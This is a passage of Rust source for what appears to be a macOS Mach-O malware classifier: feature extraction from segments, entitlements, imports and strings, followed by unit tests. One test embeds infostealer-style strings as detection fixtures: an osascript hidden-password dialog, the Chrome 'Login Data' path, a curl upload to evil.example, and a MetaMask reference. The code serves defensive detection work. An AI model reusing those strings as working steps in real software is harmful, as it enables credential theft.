    fv.flag(
        F::HasRestrict,
        restrict || sections.iter().any(|s| s.sectname == "__restrict"),
    );
    fv.count(F::NWxSegments, n_wx);
    fv.count(F::NExecSegments, n_x);
    fv.count(F::NNonstdSegments, n_nonstd);
    fv.log2(F::DataSizeLog2, data_total);
    fv.set(F::EntropyData, entropy_of(&data_hist, data_total));
    fv.log2(F::LinkeditSizeLog2, linkedit);
    fv.log2(F::OverlayLog2, (data.len() as u64).saturating_sub(max_end));

    let mut max_entropy = 0f32;
    let mut high = 0u64;
    for s in &sections {
        if s.segname == "__TEXT" && s.sectname == "__text" {
            fv.log2(F::TextSizeLog2, s.data.len() as u64);
            fv.set(F::EntropyText, entropy(s.data));
        }
        if s.data.len() >= MIN_ENTROPY_SECTION {
            let e = entropy(s.data);
            max_entropy = max_entropy.max(e);
            if s.data.len() >= 1024 && e > 7.2 {
                high += 1;
            }
        }
    }
    fv.set(F::EntropyMaxSection, max_entropy);
    fv.count(F::NHighEntropySections, high);
    fv.flag(
        F::HasObjc,
        sections.iter().any(|s| s.sectname.starts_with("__objc_")),
    );
    fv.flag(
        F::HasSwift,
        sections.iter().any(|s| s.sectname.starts_with("__swift5_")),
    );
    fv.flag(
        F::IsGo,
        sections.iter().any(|s| {
            matches!(
                s.sectname.as_str(),
                "__go_buildinfo" | "__gopclntab" | "__gosymtab"
            )
        }),
    );
    sections
}

fn dylib_name(data: &[u8], cmd_offset: usize, name_offset: u32) -> &str {
    let at = cmd_offset.saturating_add(name_offset as usize);
    macho::read_cstr(data, at, 4096)
        .and_then(|s| std::str::from_utf8(s).ok())
        .unwrap_or("")
}

fn load_command_features(fv: &mut Fv, data: &[u8], m: &MachO<'_>) {
    let (mut n_dylibs, mut n_weak, mut n_reexport, mut n_rel, mut n_nonsys) =
        (0u64, 0u64, 0u64, 0u64, 0u64);
    let mut libs: Vec<&str> = Vec::new();
    let mut unknown = 0u64;
    for lc in &m.load_commands {
        match &lc.command {
            CommandVariant::LoadDylib(c)
            | CommandVariant::LoadUpwardDylib(c)
            | CommandVariant::LazyLoadDylib(c)
            | CommandVariant::LoadWeakDylib(c)
            | CommandVariant::ReexportDylib(c) => {
                n_dylibs += 1;
                match &lc.command {
                    CommandVariant::LoadWeakDylib(_) => n_weak += 1,
                    CommandVariant::ReexportDylib(_) => n_reexport += 1,
                    _ => {}
                }
                let name = dylib_name(data, lc.offset, c.dylib.name);
                if name.starts_with('@') {
                    n_rel += 1;
                } else if !(name.starts_with("/usr/lib/") || name.starts_with("/System/")) {
                    n_nonsys += 1;
                }
                libs.push(name);
            }
            CommandVariant::Main(_) => fv.flag(F::HasMain, true),
            CommandVariant::Unixthread(_) => fv.flag(F::HasUnixthread, true),
            CommandVariant::DyldInfo(_) | CommandVariant::DyldInfoOnly(_) => {
                fv.flag(F::HasDyldInfo, true)
            }
            CommandVariant::DyldChainedFixups(_) => fv.flag(F::HasChainedFixups, true),
            CommandVariant::FunctionStarts(_) => fv.flag(F::HasFunctionStarts, true),
            CommandVariant::DataInCode(_) => fv.flag(F::HasDataInCode, true),
            CommandVariant::BuildVersion(c) => {
                fv.flag(F::HasBuildVersion, true);
                fv.set(F::MinOs, version_value(c.minos));
                fv.set(F::SdkVersion, version_value(c.sdk));
            }
            CommandVariant::VersionMinMacosx(c) => {
                fv.flag(F::HasBuildVersion, true);
                fv.set(F::MinOs, version_value(c.version));
                fv.set(F::SdkVersion, version_value(c.sdk));
            }
            CommandVariant::EncryptionInfo32(c) => {
                fv.flag(F::HasEncryption, true);
                fv.count(F::Cryptid, u64::from(c.cryptid));
            }
            CommandVariant::EncryptionInfo64(c) => {
                fv.flag(F::HasEncryption, true);
                fv.count(F::Cryptid, u64::from(c.cryptid));
            }
            CommandVariant::Unimplemented(_) => unknown += 1,
            _ => {}
        }
    }
    fv.count(F::NDylibs, n_dylibs);
    fv.count(F::NWeakDylibs, n_weak);
    fv.count(F::NReexportDylibs, n_reexport);
    fv.count(F::NRpaths, m.rpaths.len() as u64);
    fv.count(F::NDylibsRelative, n_rel);
    fv.count(F::NDylibsNonSystem, n_nonsys);
    fv.count(F::NUnknownCmds, unknown);
    let links = |needles: &[&str]| libs.iter().any(|l| needles.iter().any(|n| l.contains(n)));
    fv.flag(F::LinksSecurity, links(&["/Security.framework/"]));
    fv.flag(F::LinksIokit, links(&["/IOKit.framework/"]));
    fv.flag(
        F::LinksAppkit,
        links(&["/AppKit.framework/", "/Cocoa.framework/"]),
    );
    fv.flag(F::LinksFoundation, links(&["/Foundation.framework/"]));
    fv.flag(F::LinksCurl, links(&["/usr/lib/libcurl"]));
    fv.flag(
        F::LinksOsakit,
        links(&["/OSAKit.framework/", "/AppleScriptObjC.framework/"]),
    );
}

fn signature_features(fv: &mut Fv, s: &CodeSignatureSummary) {
    fv.flag(F::HasCodeSig, s.present);
    fv.log2(F::CodeSigSizeLog2, u64::from(s.size));
    fv.flag(F::CsAdhoc, s.adhoc);
    fv.flag(F::CsRuntime, s.runtime);
    fv.flag(F::CsLinkerSigned, s.linker_signed);
    fv.flag(F::CsHasCms, s.has_cms);
    fv.flag(F::CsHasTeamId, s.team_id.is_some());
    fv.flag(F::CsHasRequirements, s.has_requirements);
    fv.flag(
        F::HasEntitlements,
        s.entitlements.is_some() || s.der_entitlements,
    );
    if let Some(x) = &s.entitlements {
        fv.count(F::EntNKeys, x.matches("<key>").count() as u64);
        fv.flag(
            F::EntGetTaskAllow,
            x.contains("com.apple.security.get-task-allow"),
        );
        fv.flag(
            F::EntDisableLibVal,
            x.contains("com.apple.security.cs.disable-library-validation"),
        );
        fv.flag(
            F::EntUnsignedExecMem,
            x.contains("com.apple.security.cs.allow-unsigned-executable-memory")
                || x.contains("com.apple.security.cs.allow-jit"),
        );
        fv.flag(
            F::EntDyldEnv,
            x.contains("com.apple.security.cs.allow-dyld-environment-variables"),
        );
        fv.flag(
            F::EntAppSandbox,
            x.contains("com.apple.security.app-sandbox"),
        );
    }
}

/// Distinct normalised import names (leading `_` and `OBJC_CLASS_$_` stripped).
fn collect_imports<'a>(data: &'a [u8], m: &MachO<'a>) -> BTreeSet<String> {
    let mut raw: Vec<&[u8]> = Vec::new();
    let le = m.little_endian;
    for lc in &m.load_commands {
        match &lc.command {
            CommandVariant::DyldInfo(c) | CommandVariant::DyldInfoOnly(c) => {
                if let Some(s) = macho::sub(data, u64::from(c.bind_off), u64::from(c.bind_size)) {
                    macho::bind_symbol_names(s, &mut raw, macho::MAX_IMPORTS);
                }
                if let Some(s) = macho::sub(
                    data,
                    u64::from(c.lazy_bind_off),
                    u64::from(c.lazy_bind_size),
                ) {
                    macho::bind_symbol_names(s, &mut raw, macho::MAX_IMPORTS);
                }
            }
            CommandVariant::DyldChainedFixups(c) => {
                if let Some(s) = macho::sub(data, u64::from(c.dataoff), u64::from(c.datasize)) {
                    macho::chained_import_names(s, le, &mut raw, macho::MAX_IMPORTS);
                }
            }
            _ => {}
        }
    }
    if let Some(symbols) = &m.symbols {
        for sym in symbols.iter().take(macho::MAX_SYMBOLS) {
            if raw.len() >= macho::MAX_IMPORTS {
                break;
            }
            let Ok((name, nl)) = sym else { break };
            if nl.n_type & N_STAB == 0
                && nl.n_type & N_TYPE == N_UNDF
                && nl.n_type & N_EXT != 0
                && !name.is_empty()
            {
                raw.push(name.as_bytes());
            }
        }
    }
    raw.into_iter()
        .filter_map(|n| std::str::from_utf8(n).ok())
        .map(|n| {
            let n = n.strip_prefix('_').unwrap_or(n);
            n.strip_prefix("OBJC_CLASS_$_").unwrap_or(n).to_owned()
        })
        .collect()
}

fn family_matches(name: &str, patterns: &[&str]) -> bool {
    patterns.iter().any(|p| match p.strip_suffix('*') {
        Some(prefix) => name.starts_with(prefix),
        None => name == *p,
    })
}

fn import_features(fv: &mut Fv, imports: &BTreeSet<String>) {
    fv.count(F::NImports, imports.len() as u64);
    let mut families = 0u64;
    for (f, patterns) in IMPORT_FAMILIES {
        let n = imports
            .iter()
            .filter(|i| family_matches(i, patterns))
            .count() as u64;
        if n > 0 {
            families += 1;
        }
        fv.count(*f, n);
    }
    fv.count(F::NImportFamilies, families);
}

fn export_and_symbol_features(fv: &mut Fv, data: &[u8], m: &MachO<'_>) {
    let mut trie_exports: Option<u64> = None;
    for lc in &m.load_commands {
        let range = match &lc.command {
            CommandVariant::DyldInfo(c) | CommandVariant::DyldInfoOnly(c) if c.export_size > 0 => {
                Some((u64::from(c.export_off), u64::from(c.export_size)))
            }
            CommandVariant::DyldExportsTrie(c) if c.datasize > 0 => {
                Some((u64::from(c.dataoff), u64::from(c.datasize)))
            }
            _ => None,
        };
        if let Some((off, len)) = range {
            if let Some(trie) = macho::sub(data, off, len) {
                *trie_exports.get_or_insert(0) += macho::count_trie_exports(trie);
            }
        }
    }
    let mut nsyms = 0u64;
    let mut defined_ext = 0u64;
    if let Some(symbols) = &m.symbols {
        for sym in symbols.iter().take(macho::MAX_SYMBOLS) {
            let Ok((_, nl)) = sym else { break };
            nsyms += 1;
            if nl.n_type & N_STAB == 0
                && nl.n_type & N_TYPE == N_SECT
                && nl.n_type & N_EXT != 0
                && nl.n_type & N_PEXT == 0
            {
                defined_ext += 1;
            }
        }
    }
    fv.count(F::NExports, trie_exports.unwrap_or(defined_ext));
    fv.count(F::NSymbols, nsyms);
}

fn string_automaton() -> Option<&'static AhoCorasick> {
    static AC: OnceLock<Option<AhoCorasick>> = OnceLock::new();
    AC.get_or_init(|| {
        AhoCorasick::builder()
            .ascii_case_insensitive(true)
            .match_kind(MatchKind::Standard)
            .build(STRING_PATTERNS.iter().map(|(p, _)| p))
            .ok()
    })
    .as_ref()
}

fn string_features(fv: &mut Fv, data: &[u8], sections: &[SectionInfo<'_>]) {
    let mut chunks: Vec<&[u8]> = Vec::new();
    let mut budget = MAX_STRING_SCAN;
    for s in sections {
        if budget == 0 {
            break;
        }
        if STRING_SECTIONS.contains(&s.sectname.as_str()) && !s.data.is_empty() {
            let take = s.data.len().min(budget);
            chunks.push(&s.data[..take]);
            budget -= take;
        }
    }
    if chunks.is_empty() {
        chunks.push(&data[..data.len().min(MAX_STRING_SCAN)]);
    }
    let scanned: usize = chunks.iter().map(|c| c.len()).sum();
    fv.log2(F::StringsBytesLog2, scanned as u64);

    let mut printable = 0u64;
    for c in &chunks {
        let mut run = 0usize;
        for &b in c.iter() {
            if (0x20..0x7f).contains(&b) {
                run += 1;
            } else {
                if run >= 6 {
                    printable += 1;
                }
                run = 0;
            }
        }
        if run >= 6 {
            printable += 1;
        }
    }
    fv.log2(F::NPrintableLog2, printable);

    let Some(ac) = string_automaton() else { return };
    let mut counts = vec![0u64; STRING_PATTERNS.len()];
    for c in &chunks {
        for mat in ac.find_overlapping_iter(*c) {
            if let Some(slot) = counts.get_mut(mat.pattern().as_usize()) {
                *slot += 1;
            }
        }
    }
    let mut per_feature: std::collections::BTreeMap<usize, u64> = std::collections::BTreeMap::new();
    for ((_, f), n) in STRING_PATTERNS.iter().zip(counts) {
        *per_feature.entry(*f as usize).or_default() += n;
    }
    // `sh -c` also matches inside `bash -c` / `zsh -c`, which is intended.
    for (idx, n) in per_feature {
        if let Some(slot) = fv.0.get_mut(idx) {
            *slot = n.min(COUNT_CAP) as f32;
        }
    }
}

#[cfg(test)]
pub(crate) fn index_of(name: &str) -> usize {
    FEATURE_NAMES
        .iter()
        .position(|n| *n == name)
        .expect("unknown feature")
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::testutil::{fat, MachOBuilder, CPU_ARM64, CPU_X86_64};

    fn get(v: &[f32], name: &str) -> f32 {
        v[index_of(name)]
    }

    #[test]
    fn layout_is_consistent() {
        assert_eq!(FEATURE_NAMES.len(), FEATURE_DOCS.len());
        assert!(
            (60..=150).contains(&FEATURE_NAMES.len()),
            "{}",
            FEATURE_NAMES.len()
        );
        let set: BTreeSet<_> = FEATURE_NAMES.iter().collect();
        assert_eq!(set.len(), FEATURE_NAMES.len(), "duplicate feature names");
        assert_eq!(F::StrLoginItems as usize, FEATURE_NAMES.len() - 1);
        assert!(FEATURE_NAMES.iter().all(|n| n
            .bytes()
            .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'_')));
    }

    #[test]
    fn thin_arm64_features() {
        let bin = MachOBuilder::new_arm64_execute()
            .dylib("/System/Library/Frameworks/Security.framework/Versions/A/Security")
            .dylib("@rpath/libfoo.dylib")
            .rpath("@executable_path/../Frameworks")
            .imports(&["_socket", "_connect", "_SecItemCopyMatching", "_SecKeychainFindGenericPassword", "_OBJC_CLASS_$_NSTask", "_ptrace"])
            .cstrings(&[
                "osascript -e 'display dialog \"x\" default answer \"\" with hidden answer'",
                "/Library/Application Support/Google/Chrome/Default/Login Data",
                "curl -s http://evil.example/up",
                "MetaMask",
            ])
            .code_signature(true, None, Some("<plist><dict><key>com.apple.security.get-task-allow</key><true/></dict></plist>"))
            .build();
        let v = extract_features(&bin).unwrap();
        assert_eq!(v.len(), feature_names().len());
        assert!(v.iter().all(|x| x.is_finite()));
        assert_eq!(get(&v, "is_fat"), 0.0);
        assert_eq!(get(&v, "cpu_arm64"), 1.0);
        assert_eq!(get(&v, "filetype_execute"), 1.0);
        assert_eq!(get(&v, "flag_pie"), 1.0);
        assert_eq!(get(&v, "has_lc_main"), 1.0);
        assert_eq!(get(&v, "n_dylibs"), 3.0);
        assert_eq!(get(&v, "n_dylibs_relative"), 1.0);
        assert_eq!(get(&v, "n_rpaths"), 1.0);
        assert_eq!(get(&v, "links_security_framework"), 1.0);
        assert_eq!(get(&v, "n_imports"), 6.0);
        assert_eq!(get(&v, "imp_network"), 2.0);
        assert_eq!(get(&v, "imp_keychain"), 2.0);
        assert_eq!(get(&v, "imp_exec"), 1.0);
        assert_eq!(get(&v, "imp_antidebug"), 1.0);
        assert_eq!(get(&v, "n_import_families"), 4.0);
        assert_eq!(get(&v, "str_osascript"), 1.0);
        assert_eq!(get(&v, "str_display_dialog"), 1.0);
        assert_eq!(get(&v, "str_hidden_answer"), 1.0);
        assert_eq!(get(&v, "str_browser_chrome"), 1.0);
        assert_eq!(get(&v, "str_login_data"), 1.0);
        assert_eq!(get(&v, "str_curl"), 1.0);
        assert_eq!(get(&v, "str_http"), 1.0);
        assert_eq!(get(&v, "str_crypto_wallets"), 1.0);
        assert_eq!(get(&v, "has_code_signature"), 1.0);
        assert_eq!(get(&v, "cs_adhoc"), 1.0);
        assert_eq!(get(&v, "ent_get_task_allow"), 1.0);
        assert_eq!(get(&v, "ent_n_keys"), 1.0);
        assert!((get(&v, "min_os_version") - 13.0).abs() < 1e-6);
        assert!((get(&v, "sdk_version") - 14.02).abs() < 1e-4);
        assert!(get(&v, "entropy_slice") > 0.0 && get(&v, "entropy_slice") <= 8.0);
        assert_eq!(get(&v, "has_pagezero"), 1.0);
        assert_eq!(get(&v, "n_segments"), 3.0);
        assert_eq!(get(&v, "n_sections"), 2.0);
    }

    #[test]
    fn fat_prefers_arm64_slice() {
        let x86 = MachOBuilder::new_arm64_execute()
            .cputype(CPU_X86_64)
            .build();
        let arm = MachOBuilder::new_arm64_execute().filetype(6).build();
        let bin = fat(&[(CPU_X86_64, x86), (CPU_ARM64, arm)]);
        let v = extract_features(&bin).unwrap();
        assert_eq!(get(&v, "is_fat"), 1.0);
        assert_eq!(get(&v, "fat_nslices"), 2.0);
        assert_eq!(get(&v, "fat_has_arm64"), 1.0);
        assert_eq!(get(&v, "fat_has_x86_64"), 1.0);
        assert_eq!(get(&v, "cpu_arm64"), 1.0);
        assert_eq!(get(&v, "filetype_dylib"), 1.0);
    }

    #[test]
    fn fat_falls_back_to_first_parsable_slice() {
        let x86 = MachOBuilder::new_arm64_execute()
            .cputype(CPU_X86_64)
            .build();
        let bin = fat(&[(CPU_ARM64, vec![0xff; 64]), (CPU_X86_64, x86)]);
        let v = extract_features(&bin).unwrap();
        assert_eq!(get(&v, "cpu_x86_64"), 1.0);
    }

    #[test]
    fn deterministic() {
        let bin = MachOBuilder::new_arm64_execute()
            .cstrings(&["hello world"])
            .build();
        assert_eq!(
            extract_features(&bin).unwrap(),
            extract_features(&bin).unwrap()
        );
    }

    #[test]
    fn rejects_garbage_without_panicking() {
        assert!(matches!(extract_features(b"hello"), Err(MlError::NotMachO)));
        assert!(matches!(extract_features(&[]), Err(MlError::NotMachO)));
        // Java class file magic
        let java = [0xca, 0xfe, 0xba, 0xbe, 0x00, 0x00, 0x00, 0x34, 0, 0, 0, 0];
        assert!(extract_features(&java).is_err());
        // Truncations and bit flips of a valid binary never panic.
        let bin = MachOBuilder::new_arm64_execute()
            .imports(&["_socket"])
            .code_signature(false, Some("ABCDE12345"), None)
            .cstrings(&["abc"])
            .build();
        for cut in (0..bin.len()).step_by(7) {
            let _ = extract_features(&bin[..cut]);
        }
        let mut state = 0x1234_5678u32;
        for _ in 0..300 {
            let mut b = bin.clone();
            for _ in 0..4 {
                state ^= state << 13;
                state ^= state >> 17;
                state ^= state << 5;
                let i = 4 + (state as usize) % (b.len() - 4);
                b[i] = (state >> 8) as u8;
            }
            if let Ok(v) = extract_features(&b) {
                assert_eq!(v.len(), feature_names().len());
                assert!(v.iter().all(|x| x.is_finite()));
            }
        }
    }

    #[test]
    fn huge_counts_in_header_are_rejected_quickly() {
        let mut bin = MachOBuilder::new_arm64_execute().build();
        bin[16..20].copy_from_slice(&u32::MAX.to_le_bytes()); // ncmds
        assert!(extract_features(&bin).is_err());
    }
}
